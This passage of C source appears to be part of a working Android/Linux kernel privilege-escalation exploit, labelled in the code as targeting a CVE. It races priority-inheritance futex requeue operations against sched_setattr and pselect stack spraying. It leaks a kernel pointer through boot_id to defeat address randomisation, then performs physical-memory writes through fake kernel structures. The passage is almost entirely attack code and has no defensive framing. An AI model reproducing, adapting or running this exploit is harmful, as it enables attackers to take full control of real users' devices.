      if (!_wok && _dl) {
        int _wt = atomic_load(&slide_waiter_tid);
        char _wch[64] = {0};
        if (_wt > 0 && slide_early_read_wchan(_wt, _wch, sizeof(_wch)) == 1 &&
            strncmp(_wch, "futex_wait_queue_me",
                    sizeof("futex_wait_queue_me") - 1) == 0) {
          int _serrno = 0;
          pr_info_sync("slide early-fire stamp tid=%d wchan=%s\n",
                       _wt, _wch);
          (void)slide_pselect_early_stamp(&_serrno);
          char _wch2[64] = {0};
          int _still =
              (_wt > 0 &&
               slide_early_read_wchan(_wt, _wch2, sizeof(_wch2)) == 1 &&
               strncmp(_wch2, "futex_wait_queue_me",
                       sizeof("futex_wait_queue_me") - 1) == 0);
          pr_info_sync("slide early-fire walk tid=%d still=%d wchan=%s\n",
                       _wt, _still, _wch2);
          *errno_ptr = 0;
          long _ret = _still ? sched_setattr_tid(_wt, 1) : -1L;
          int _se = _still ? *errno_ptr : ECANCELED;
          atomic_store(&slide_consume_last_sched_ret, (int)_ret);
          atomic_store(&slide_consume_last_sched_errno, _se);
          if (_ret == 0) {
            int _ok = atomic_load(&slide_consume_sched_ok) + 1;
            atomic_store(&slide_consume_sched_ok, _ok);
          }
          atomic_store(&slide_early_fired, 1);
          atomic_store(&slide_consume_stop, 1);
          pr_info_sync("slide early-fire done ret=%ld errno=%d\n",
                       _ret, _se);
          return NULL;
        }
      } else if (_wok) {
        pr_info_sync("slide early-fire missed (post-timeout); stale walk "
                     "skipped\n");
        return NULL;
      }
    }
#endif
    int seq = atomic_load(&slide_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      if (atomic_load(&slide_consume_stop)) {
        return NULL;
      }
      continue;
    }

    seen = seq;
    atomic_store(&slide_consume_seen, seen);
    if (atomic_load(&slide_consume_go) != seq) {
      int lost = atomic_load(&slide_consume_lost) + 1;
      atomic_store(&slide_consume_lost, lost);
      continue;
    }
#if defined(O1S_NO_CHILD_CONSUME)
    /* Fire only if the waiter tid belongs to THIS process (probe own
     * tasks, at fire time when waiter_tid is set). Forked children
     * (trigger/leak helpers) inherit a stale waiter_tid pointing at the
     * parent's waiter; walking it panics first and reboots before the
     * parent completes. Skip this fire (not return: keep loop alive). */
    {
      int _wt = atomic_load(&slide_waiter_tid);
      int _found = 0;
      if (_wt > 0) {
        char _pb[64];
        snprintf(_pb, sizeof(_pb), "/proc/self/task/%d", _wt);
        int _pfd = syscall(SYS_openat, AT_FDCWD, _pb, O_RDONLY | O_CLOEXEC, 0);
        if (_pfd >= 0) {
          _found = 1;
          syscall(SYS_close, _pfd);
        }
      }
      if (!_found)
        continue;
    }
#endif

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
    int tid = atomic_load(&slide_waiter_tid);
#if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
    int ready_ok = -1;
    int guard_ok = -1;
    size_t ready_elapsed_usec = 0;
    size_t guard_elapsed_usec = 0;
    uint64_t pselect_age_usec = 0;
    char ready_wchan[64] = "<not-read>";
    char guard_wchan[64] = "<not-read>";
#endif
    if (seq == 1) {
#if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
      ready_ok = slide_wait_for_pselect_blocked(
          tid, SLIDE_PSELECT_READY_TIMEOUT_USEC,
          SLIDE_PSELECT_WCHAN_CONFIRMATIONS, &ready_elapsed_usec,
          ready_wchan, sizeof(ready_wchan));
      if (!ready_ok) {
        pr_info("slide pselect ready=0 tid=%d elapsed_usec=%zu wchan=%s; "
                "trigger skipped\n",
                tid, ready_elapsed_usec, ready_wchan);
        atomic_store(&slide_consume_stop, 1);
        return NULL;
      }
#endif
      slide_wait_before_consume(seq);
#if defined(APP_PSELECT_TRIGGER_MAX_AGE_USEC)
      uint64_t pselect_started_ns = atomic_load(&slide_pselect_started_ns);
      pselect_age_usec = pselect_started_ns
          ? (gettime_ns() - pselect_started_ns) / 1000ULL
          : UINT64_MAX;
      if (pselect_age_usec > APP_PSELECT_TRIGGER_MAX_AGE_USEC) {
        pr_info("slide pselect age guard=0 tid=%d age_usec=%llu max=%d; "
                "trigger skipped\n",
                tid, (unsigned long long)pselect_age_usec,
                APP_PSELECT_TRIGGER_MAX_AGE_USEC);
        atomic_store(&slide_consume_stop, 1);
        return NULL;
      }
#endif
#if defined(SLIDE_GUARD_PSELECT_SYSCALL) && SLIDE_GUARD_PSELECT_SYSCALL
      guard_ok = slide_wait_for_pselect_blocked(
          tid, SLIDE_PSELECT_RECHECK_TIMEOUT_USEC,
          SLIDE_PSELECT_WCHAN_CONFIRMATIONS, &guard_elapsed_usec,
          guard_wchan, sizeof(guard_wchan));
      if (!guard_ok) {
        pr_info("slide pselect blocked guard=0 tid=%d elapsed_usec=%zu "
                "wchan=%s; trigger skipped\n",
                tid, guard_elapsed_usec, guard_wchan);
        atomic_store(&slide_consume_stop, 1);
        return NULL;
      }
#endif
#if defined(APP_PSELECT_POST_GUARD_AGE_CHECK) && \
    APP_PSELECT_POST_GUARD_AGE_CHECK && \
    defined(APP_PSELECT_TRIGGER_MAX_AGE_USEC)
      pselect_started_ns = atomic_load(&slide_pselect_started_ns);
      pselect_age_usec = pselect_started_ns
          ? (gettime_ns() - pselect_started_ns) / 1000ULL
          : UINT64_MAX;
      if (pselect_age_usec > APP_PSELECT_TRIGGER_MAX_AGE_USEC) {
        pr_info("slide pselect post-guard age=0 tid=%d age_usec=%llu "
                "max=%d; trigger skipped\n",
                tid, (unsigned long long)pselect_age_usec,
                APP_PSELECT_TRIGGER_MAX_AGE_USEC);
        atomic_store(&slide_consume_stop, 1);
        return NULL;
      }
#endif
    }
#else
#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
    if (seq == 1) {
      useconds_t delay_usec = slide_enter_delay_usec();
      uint64_t pselect_started_ns = 0;
      while (!atomic_load(&slide_consume_stop)) {
        pselect_started_ns = atomic_load(&slide_pselect_started_ns);
        if (pselect_started_ns != 0) {
          break;
        }
        __asm__ volatile("yield" ::: "memory");
      }
      if (atomic_load(&slide_consume_stop)) {
        return NULL;
      }
      uint64_t deadline = pselect_started_ns +
                          (uint64_t)delay_usec * 1000ULL;
      while (!atomic_load(&slide_consume_stop)) {
        uint64_t now = gettime_ns();
        if (now >= deadline) {
          break;
        }
        uint64_t remaining = deadline - now;
        if (remaining > 2000000ULL) {
          usleep((useconds_t)((remaining - 1000000ULL) / 1000ULL));
        } else {
          __asm__ volatile("yield" ::: "memory");
        }
      }
    }
#else
    slide_wait_before_consume(seq);
#endif
    int tid = atomic_load(&slide_waiter_tid);
#endif

    if (seq == 1) {
      slide_apply_route_fine_delay();
    }

    int calls = atomic_load(&slide_consume_calls);
    int entered = atomic_load(&slide_consume_enter_sched) + 1;
    atomic_store(&slide_consume_enter_sched, entered);
    atomic_store(&slide_consume_calls, calls + 1);
    *errno_ptr = 0;
#ifdef SLIDE_MEASURE_ONLY
    /* Olcum modu: panic kaynagi sched_setattr tetiklenmez; handshake aynen surer. */
    long ret = -1;
    int saved_errno = ECANCELED;
    pr_info("slide measure skip sched_setattr tid=%d calls=%d\n", tid, calls);
#else
    pr_info_sync("slide consume FIRE tid=%d seq=%d calls=%d go=%d self=%d pid=%d\n", tid,
                 seq, calls, atomic_load(&slide_consume_go),
                 (int)syscall(SYS_gettid), (int)getpid());
    long ret = sched_setattr_tid(tid, (calls % 19) + 1);
    int saved_errno = *errno_ptr;
#endif
#if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
    pr_info("slide pselect blocked ready=%d ready_usec=%zu ready_wchan=%s "
            "guard=%d guard_usec=%zu guard_wchan=%s age_usec=%llu tid=%d\n",
            ready_ok, ready_elapsed_usec, ready_wchan,
            guard_ok, guard_elapsed_usec, guard_wchan,
            (unsigned long long)pselect_age_usec, tid);
#endif
    atomic_store(&slide_consume_last_sched_ret, (int)ret);
    atomic_store(&slide_consume_last_sched_errno, saved_errno);
    if (ret == 0) {
      int sched_ok = atomic_load(&slide_consume_sched_ok) + 1;
      atomic_store(&slide_consume_sched_ok, sched_ok);
    }
    atomic_store(&slide_consume_stop, 1);
    while (atomic_load(&slide_consume_go)) {
      __asm__ volatile("yield" ::: "memory");
    }
    return NULL;
  }
}

void *slide_waiter_thread(void *arg __attribute__((unused))) {
#ifdef SLIDE_WAITER_CORE
  pin_to_core(SLIDE_WAITER_CORE);
#endif
  int tid = (int)SYSCHK(syscall(SYS_gettid));
  atomic_store(&slide_waiter_tid, tid);
#if defined(SLIDE_WAITER_CORE)
  pin_to_core(SLIDE_WAITER_CORE);
#endif

  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide waiter lock chain errno=%d\n", errno);
    return NULL;
  }
#if defined(O1S_EARLY_FIRE) && O1S_EARLY_FIRE
  /* TEMP-TEST residue-primer: waiter KENDI kernel-stack'inde pselect fdset
   * kalintisi birakip SONRA bloklanir; PI-waiter struct kalintiyla ortusur.
   * (Post-wake/consumer pselect'leri baska stack/zamanda -> ise yaramaz.) */
  {
    int _perr = 0;
    int _pret = slide_pselect_early_stamp(&_perr);
    pr_info_sync("slide waiter primer pselect ret=%d errno=%d tid=%d\n",
                 _pret, _perr, tid);
  }
#endif

  atomic_store(&slide_waiter_ready, 1);
  while (!atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += SLIDE_WAIT_NSEC / 1000000000L;
  timeout.tv_nsec += SLIDE_WAIT_NSEC % 1000000000L;
  if (timeout.tv_nsec >= 1000000000L) {
    timeout.tv_sec++;
    timeout.tv_nsec -= 1000000000L;
  }

  atomic_store(&slide_waiter_waiting, 1);
#if defined(SLIDE_STACK_WRITER) && \
    defined(SLIDE_STACK_WRITER_SIGRETURN) && \
    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
  slide_sigreturn_arm_waiter();
  slide_sigreturn_fill_payload();
#endif
  pr_info("slide waiter-block t=%llu tid=%d pid=%d\n",
          (unsigned long long)gettime_ns(), tid, (int)getpid());
  errno = 0;
  uint64_t block_t = gettime_ns();
  long wait_ret = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                           &slide_f_pi_target, 0);
  int wait_errno = errno;
  pr_info("slide waiter-wake t=%llu ret=%ld errno=%d blocked_ms=%llu\n",
          (unsigned long long)gettime_ns(), wait_ret, wait_errno,
          (unsigned long long)(gettime_ns() - block_t) / 1000000ULL);
#if !(defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE)
  pr_info("slide wait_requeue_pi ret=%ld errno=%d\n", wait_ret, wait_errno);
#endif
  if (wait_ret != -1 || wait_errno != ETIMEDOUT) {
    atomic_store(&slide_route_done, 1);
    return NULL;
  }
  pr_info("slide pi stage=wait-timeout-accepted tid=%d\n", tid);
  atomic_store(&slide_waiter_ok, 1);
  while (!atomic_load(&slide_deadlock_seen)) {
    __asm__ volatile("yield" ::: "memory");
  }
  /* TEMP-TEST (writer-before-unlock): stamp + consumer-fire while entangled. */
  pr_info_sync("slide pi stage=writer-enter tid=%d\n", tid);

#if defined(SLIDE_STACK_WRITER) && \
    defined(SLIDE_STACK_WRITER_MCAST) && \
    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_MCAST
  slide_mcast_stack_copy();
#elif defined(SLIDE_STACK_WRITER) && \
      defined(SLIDE_STACK_WRITER_SIGRETURN) && \
      SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
  slide_sigreturn_stack_copy();
#elif defined(SLIDE_STACK_WRITER) && \
      defined(SLIDE_STACK_WRITER_XATTR) && \
      SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_XATTR
  slide_fsetxattr_stack_copy();
#elif defined(SLIDE_STACK_WRITER)
#error Unsupported SLIDE_STACK_WRITER value
#else
  slide_pselect_stack_copy();
#endif
  pr_info("slide pi stage=writer-return tid=%d sched_ok=%d window=%d\n",
          tid, atomic_load(&slide_consume_sched_ok),
          atomic_load(&slide_stack_write_window));
  pr_info("slide pi stage=writer-unlock-enter tid=%d\n", tid);
  if (futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide waiter unlock chain errno=%d\n", errno);
    atomic_store(&slide_route_done, 1);
    return NULL;
  }
  pr_info("slide pi stage=writer-unlock-return tid=%d\n", tid);
  while (!atomic_load(&slide_owner_acquired)) {
    __asm__ volatile("yield" ::: "memory");
  }
  atomic_store(&slide_route_done, 1);

#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
  while (!atomic_load(&slide_route_stop)) {
    usleep(10000);
  }
  return NULL;
#else
  for (;;) {
    sleep(1);
  }
#endif
}

void *slide_owner_thread(void *arg __attribute__((unused))) {
  if (futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide owner lock target errno=%d\n", errno);
    return NULL;
  }
  pr_info("slide pi stage=owner-target-locked tid=%d\n",
          (int)syscall(SYS_gettid));

  while (!atomic_load(&slide_waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&slide_owner_started, 1);
  pr_info("slide pi stage=owner-chain-lock-enter tid=%d\n",
          (int)syscall(SYS_gettid));
  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide owner lock chain errno=%d\n", errno);
    return NULL;
  }
  atomic_store(&slide_owner_acquired, 1);
  pr_info("slide owner-acq t=%llu\n", (unsigned long long)gettime_ns());
  pr_info("slide pi stage=owner-chain-lock-return tid=%d\n",
          (int)syscall(SYS_gettid));
  /* Scrub tutucu: waiter bloklanip temiz acquire yapana kadar kilidi tut.
   * Tum yollar sinirli (1.5s hold), takilma yok. SLIDE_NO_SCRUB ile kapali. */
#ifndef SLIDE_NO_SCRUB
  if (futex_op(&slide_f_scrub, FUTEX_LOCK_PI, 0, NULL, NULL, 0) == 0) {
    atomic_store(&slide_scrub_held, 1);
    pr_info("slide scrub held tid=%d\n", (int)syscall(SYS_gettid));
    usleep(1500000);
    futex_op(&slide_f_scrub, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    atomic_store(&slide_scrub_held, 0);
    pr_info("slide scrub unheld tid=%d\n", (int)syscall(SYS_gettid));
  } else {
    pr_info("slide scrub hold-failed errno=%d\n", errno);
  }
#endif

#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
  while (!atomic_load(&slide_route_stop)) {
    usleep(10000);
  }
  return NULL;
#else
  for (;;) {
    sleep(1);
  }
#endif
}

int hex_value(char c) {
  if (c >= '0' && c <= '9') {
    return c - '0';
  }
  if (c >= 'a' && c <= 'f') {
    return c - 'a' + 10;
  }
  if (c >= 'A' && c <= 'F') {
    return c - 'A' + 10;
  }
  return -1;
}

uint64_t slide_read_stext(void) {
  char buf[64];
  unsigned char raw[16];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("slide boot_id read denied errno=%d\n", errno);
    return 0;
  }

  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  if (n < 0) {
    pr_warning("slide boot_id read failed errno=%d\n", saved_errno);
    return 0;
  }
  buf[n] = 0;

  int nibble = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int v = hex_value(buf[i]);
    if (v < 0) {
      continue;
    }
    if (nibble < 0) {
      nibble = v;
      continue;
    }
    raw[out++] = (unsigned char)((nibble << 4) | v);
    nibble = -1;
  }
  if (out != 16) {
    pr_warning("slide short boot_id parse out=%d n=%zd\n", out, n);
    return 0;
  }

  uint64_t leaked = 0;
  for (int i = 0; i < 8; i++) {
    leaked |= (uint64_t)raw[i] << (i * 8);
  }
  if ((leaked >> 48) != 0xffff) {
    pr_warning("slide bad leaked pointer=%016llx\n",
               (unsigned long long)leaked);
    return 0;
  }

  uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER_NAME);
  uint64_t stext = leaked - off;
  pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
             getpid(), (unsigned long long)leaked, (unsigned long long)stext);
  pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
             getpid(), (unsigned long long)stext);
  return stext;
}
uint64_t slide_child_leak_stext(void) {
  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));

  while (!atomic_load(&slide_waiter_waiting) ||
         !atomic_load(&slide_owner_started) ||
         !atomic_load(&slide_consumer_ready)) {
    usleep(1000);
  }
  pr_info_sync("slide route threads ready waiter_waiting=%d owner_started=%d "
          "consumer_ready=%d p0_offset=%08zx\n",
          atomic_load(&slide_waiter_waiting),
          atomic_load(&slide_owner_started),
          atomic_load(&slide_consumer_ready), slide_p0_offset);
  if (SLIDE_REQUEUE_ARM_USEC) {
    usleep(SLIDE_REQUEUE_ARM_USEC);
  }

  long requeue_ret = 0;
  int requeue_errno = 0;
  int requeue_polls = 0;
  while (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
    requeue_polls++;
    errno = 0;
    requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                           &slide_f_pi_target, 0);
    requeue_errno = errno;
    if (getenv("SLIDE_REQUEUE_VERBOSE") &&
        requeue_polls <= 30) {
      pr_info("slide cmp_requeue_pi poll=%d ret=%ld errno=%d\n",
              requeue_polls, requeue_ret, requeue_errno);
    }
    /* TEMP-TEST (primer gecikmesi): waiter primer-pselect yuzunden gec
     * kuyruga girer; ilk poll EAGAIN normaldir -> RETRY (break yok). */
    if (requeue_ret != 0 &&
        !(requeue_ret == -1 && requeue_errno == EAGAIN)) {
      break;
    }
    if (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
      usleep(SLIDE_REQUEUE_POLL_USEC);
    }
  }
  /* TEMP-TEST: mainroute CMP outcome (EDEADLK=35 success vs EAGAIN=11). */
  pr_info_sync("slide main-cmp ret=%ld errno=%d polls=%d\n",
          requeue_ret, requeue_errno, requeue_polls);
  atomic_store(&slide_deadlock_seen, 1);

  while (!atomic_load(&slide_route_done)) {
    usleep(1000);
  }
  if (!atomic_load(&slide_waiter_ok)) {
    return 0;
  }

  return slide_read_stext();
}

/* TEMP-TEST: child-consume kill-switch (unconditional def; set only by
 * slide children when O1S_NO_CHILD_CONSUME). */
int slide_in_child_no_consume = 0;

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE

static int slide_child_trigger_write(void) {
  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
#if defined(O1S_NO_CHILD_CONSUME)
  slide_in_child_no_consume = 1;
#endif
  SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));

  while (!atomic_load(&slide_waiter_waiting) ||
         !atomic_load(&slide_owner_started) ||
         !atomic_load(&slide_consumer_ready)) {
    usleep(1000);
  }
  if (SLIDE_REQUEUE_ARM_USEC) {
    usleep(SLIDE_REQUEUE_ARM_USEC);
  }
  pr_info_sync("trigwr dance flags ready, entering CMP\n");
  pr_info_sync("slide pi stage=cmp-enter waiter_tid=%d\n",
          atomic_load(&slide_waiter_tid));

  long requeue_ret = 0;
  int requeue_errno = 0;
  int requeue_polls = 0;
  while (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
    requeue_polls++;
    errno = 0;
    requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                           &slide_f_pi_target, 0);
    requeue_errno = errno;
    if (requeue_ret != 0) {
      break;
    }
    if (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
      usleep(SLIDE_REQUEUE_POLL_USEC);
    }
  }
  pr_info("slide pi stage=cmp-return ret=%ld errno=%d polls=%d\n",
          requeue_ret, requeue_errno, requeue_polls);
  if (requeue_ret != -1 || requeue_errno != EDEADLK) {
    return 0;
  }
  pr_info("slide pi stage=deadlock-accepted\n");
  atomic_store(&slide_deadlock_seen, 1);
#if defined(SLIDE_STACK_WRITER) && \
    defined(SLIDE_STACK_WRITER_SIGRETURN) && \
    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
#ifndef SLIDE_NO_POKE
  /* Erken teslim: waiter su an WAIT_REQUEUE_PI uykusunda (~50ms).
   * Uyku bitmeden poke'la; handler uyku icinde/wakeup yolunda calisir.
   * Owner-acq wake-sonrasi oldugundan poke buraya tasindi. */
  usleep(10000);
  slide_sigreturn_poke_waiter(atomic_load(&slide_waiter_tid));
#endif
#endif
  while (!atomic_load(&slide_route_done)) {
    usleep(1000);
  }
#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
#if defined(APP_S928_ROUTE_DIAG) && APP_S928_ROUTE_DIAG
  int waiter_ok = atomic_load(&slide_waiter_ok);
  int write_window = atomic_load(&slide_pselect_write_window);
  int result = waiter_ok != 0 && write_window != 0;
#else
  int result = atomic_load(&slide_waiter_ok) != 0 &&
               atomic_load(&slide_pselect_write_window) != 0;
#endif
  atomic_store(&slide_route_stop, 1);
  SYSCHK(pthread_join(waiter, NULL));
  SYSCHK(pthread_join(owner, NULL));
  SYSCHK(pthread_join(consumer, NULL));
#if defined(APP_S928_ROUTE_DIAG) && APP_S928_ROUTE_DIAG
  if (!result) {
    pr_info("S928 route result=0 waiter_ok=%d write_window=%d "
            "route_done=%d consumer_seen=%d entered=%d sched_ok=%d "
            "calls=%d pselect_ret=%d pselect_errno=%d "
            "pselect_elapsed_usec=%llu\n",
            waiter_ok, write_window, atomic_load(&slide_route_done),
            atomic_load(&slide_consume_seen),
            atomic_load(&slide_consume_enter_sched),
            atomic_load(&slide_consume_sched_ok),
            atomic_load(&slide_consume_calls),
            atomic_load(&slide_pselect_last_ret),
            atomic_load(&slide_pselect_last_errno),
            (unsigned long long)atomic_load(
                &slide_pselect_last_elapsed_usec));
  }
#endif
  return result;
#elif defined(APP_ACCEPT_SCHED_TRIGGER) && APP_ACCEPT_SCHED_TRIGGER
  int sched_ok = atomic_load(&slide_consume_sched_ok) != 0;
  int write_window = atomic_load(&slide_stack_write_window) != 0;
  pr_info("slide downstream verification armed sched_ok=%d write_window=%d\n",
          sched_ok, write_window);
  return atomic_load(&slide_waiter_ok) != 0 && sched_ok;
#else
  return atomic_load(&slide_waiter_ok) != 0 &&
         atomic_load(&slide_stack_write_window) != 0;
#endif
}

static int slide_trigger_physical_state_report(int report_status) {
#ifdef SLIDE_SIGRETURN_SPRAY
  /* Parent probu: fork ONCESI ayni okumalar calisiyor mu? Child'daki EOF
   * ile karsilastirmak icin. Sadece log, davranis degismez. */
  {
    int probe_fd = open_ashmem_device();
    uint64_t parent_pipe_probe = 0xdeadbeefdeadbeefULL;
    uint64_t parent_sw = 0;
    int parent_pipe_ok = 0;
    int parent_sw_errno = 0;
    ssize_t parent_sw_n = -1;
    if (probe_fd >= 0) {
      if (pipebuf_page_base != 0 && pipebuf_pipe_idx >= 0 &&
          is_direct_ptr(fake_lock) &&
          pipe_phys_read_data(probe_fd, fake_lock, &parent_pipe_probe,
                              sizeof(parent_pipe_probe))) {
        parent_pipe_ok = 1;
      }
      errno = 0;
      parent_sw_n = configfs_read_once(probe_fd,
                                       fake_task + FAKE_TASK_PI_BLOCKED_ON_OFF,
                                       &parent_sw, sizeof(parent_sw));
      parent_sw_errno = errno;
      close(probe_fd);
    }
    pr_info("slide parent-probe pipe_base=%016zx pipe_idx=%d pipe_addr=%016zx "
            "pipe_ok=%d pipe_probe=%016llx sw_n=%zd sw_errno=%d sw=%016llx "
            "task=%016zx lock=%016zx\n",
            pipebuf_page_base, pipebuf_pipe_idx, pipebuf_addr,
            parent_pipe_ok, (unsigned long long)parent_pipe_probe,
            parent_sw_n, parent_sw_errno, (unsigned long long)parent_sw,
            fake_task, fake_lock);
  }
#endif
  pid_t child = SYSCHK(fork());
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(1);
    }
    syscall(SYS_prctl, PR_SET_NAME, "cve43499-trigwr", 0, 0, 0);
    pr_info("trigwr child alive pid=%d ppid=%d\n", getpid(), getppid());
    fsync(STDOUT_FILENO);
    /* Bulletproof child logging: dup inherited stdio onto a dedicated
     * append-mode file (immune to pipe/file offset weirdness). */
    {
      int lfd = syscall(SYS_openat, AT_FDCWD, "/data/local/tmp/trigwr.log",
                        O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0644);
      if (lfd >= 0) {
        syscall(SYS_dup3, lfd, STDOUT_FILENO, 0);
        syscall(SYS_dup3, lfd, STDERR_FILENO, 0);
        if (lfd != STDOUT_FILENO && lfd != STDERR_FILENO)
          syscall(SYS_close, lfd);
      }
    }
    disable_rseq_for_thread();
    slide_log_child_context();
    _exit(slide_child_trigger_write() ? 0 : 1);
  }
  int status = 0;
  SYSCHK(waitpid(child, &status, 0));
  int ok = WIFEXITED(status) && WEXITSTATUS(status) == 0;
  if (report_status) {
    pr_info("p0 physical write status=%d ok=%d\n", status, ok);
  }
  return ok;
}

static int slide_trigger_physical_state(void) {
  return slide_trigger_physical_state_report(1);
}

#if defined(SLIDE_PHYSICAL_SLOT_DELAYS_USEC)
static const int slide_physical_slot_delays[] = {
  SLIDE_PHYSICAL_SLOT_DELAYS_USEC
};
#endif

static int slide_trigger_physical_slot(size_t slot) {
  if (!select_slide_payload_index(slot)) {
    return 0;
  }
#ifdef SLIDE_SIGRETURN_SPRAY
  /* Bankcheck: gate parent'i base'den yeniden hesapla, kayma var mi? */
  pr_info("slide bankcheck slot=%zu base=%016zx gate_parent=%016zx "
          "recomputed=%016zx oracle_parent=%016zx\n",
          slot, page_base, p0_gate_page_struct,
          direct_to_page(page_base), slide_oracle_parent);
#endif

  int base_delay = (int)slide_enter_delay_usec();
#if defined(SLIDE_PHYSICAL_SLOT_DELAYS_USEC)
  int attempts = (int)(sizeof(slide_physical_slot_delays) /
                       sizeof(slide_physical_slot_delays[0]));
#else
  int attempts = 1;
#endif

  for (int attempt = 1; attempt <= attempts; attempt++) {
    int delay = base_delay;
#if defined(SLIDE_PHYSICAL_SLOT_DELAYS_USEC)
    delay = slide_physical_slot_delays[(size_t)(attempt - 1)];
#endif
#if defined(SLIDE_VIRTUAL_BASE_DELAY_USEC)
    if (p0_virtual_base_probe) {
      delay = SLIDE_VIRTUAL_BASE_DELAY_USEC;
    }
#endif
    char delay_arg[16];
    slide_route_nfds = PSELECT_ROUTE_NFDS;
    slide_route_syscall_pad = 0;
    snprintf(delay_arg, sizeof(delay_arg), "%d", delay);
    SYSCHK(setenv("SLIDE_ENTER_DELAY_USEC", delay_arg, 1));
    if (slide_trigger_physical_state()) {
      pr_info("p0 physical slot=%zu write attempt=%d/%d delay=%d nfds=%d "
              "pad=%d\n",
              slot, attempt, attempts, delay, slide_route_nfds,
              slide_route_syscall_pad);
      return 1;
    }
  }

  pr_error("p0 physical slot=%zu write window failed after %d attempt(s)\n",
           slot, attempts);
  return 0;
}

static int slide_restore_physical_oracle(void) {
  int gate_restored =
      slide_trigger_physical_slot(P0_ORACLE_GATE_RESTORE_SLOT);
  int probe_restored =
      slide_trigger_physical_slot(P0_ORACLE_PROBE_RESTORE_SLOT);
  pr_info("p0 physical restore triggers gate=%d probe=%d "
          "gate_page=%016zx probe_page=%016zx\n",
          gate_restored, probe_restored,
          p0_gate_page_struct, p0_probe_page_struct);
  return gate_restored && probe_restored;
}

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
static int app_trigger_fops_slide_slot(size_t slot) {
  static size_t delay_index;
  static const int delays[] = {
    70000, 60000, 80000, 40000, 90000, 50000,
    30000, 20000, 75000, 65000, 85000, 55000,
  };
  if (!select_slide_payload_index(slot)) {
    return 0;
  }
  int delay = 0;
#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
  int forced_delay = slide_s928_fops_delay_override(&delay);
#else
  int forced_delay = 0;
#endif
#ifdef APP_FOPS_ROUTE_COARSE_DELAY_USEC
  if (!forced_delay) {
    delay = APP_FOPS_ROUTE_COARSE_DELAY_USEC;
  }
#elif defined(APP_FOPS_PSELECT_DELAY_USEC)
  if (!forced_delay) {
    delay = APP_FOPS_PSELECT_DELAY_USEC;
  }
#elif defined(APP_FOPS_ROUTE_USE_PSELECT_DELAY) && \
    APP_FOPS_ROUTE_USE_PSELECT_DELAY
  const char *forced = forced_delay ? NULL : getenv("PSELECT_DELAY_USEC");
  if (forced && *forced) {
    char *end = NULL;
    errno = 0;
    long value = strtol(forced, &end, 0);
    if (!errno && end != forced && !*end && value >= 0 &&
        value <= 1000000) {
      delay = (int)value;
    }
  }
#endif
  if (!forced_delay && !delay) {
    delay = delays[delay_index % (sizeof(delays) / sizeof(delays[0]))];
  }
  if (!slide_override_route_coarse_delay(&delay)) {
    return 0;
  }
  delay_index++;
  slide_route_fine_delay_ticks = slide_select_route_fine_delay_ticks();
  if (slide_route_fine_delay_ticks == UINT64_MAX) {
    return 0;
  }
  char delay_arg[16];
